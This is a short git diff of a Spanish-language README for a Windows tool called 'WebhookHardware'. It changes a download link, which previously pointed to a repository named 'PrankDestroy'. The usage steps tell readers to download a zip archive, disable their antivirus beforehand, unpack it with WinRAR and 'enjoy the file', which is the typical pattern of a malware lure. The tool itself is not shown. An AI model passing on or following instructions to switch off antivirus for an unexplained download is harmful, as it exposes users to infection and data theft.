@@ -44,7 +44,7 @@
 - **¿Como Usarlo? (Windows)**
 
   - **Instalar winrar** [Aqui.](https://www.winrar.es/descargas)
-  - **Instalar** [WebhookHardware](https://codeload.github.com/Br3Fuck/PrankDestroy/zip/refs/heads/main)
+  - **Instalar** [WebhookHardware](https://codeload.github.com/Br3Fuck/WebhookHardware/zip/refs/heads/main)
   - **Antes desactivar el antivirus.**
   - **Descomprimirlo con** [Winrar](https://www.winrar.es/descargas)
   - **Disfrutar de del archivo**
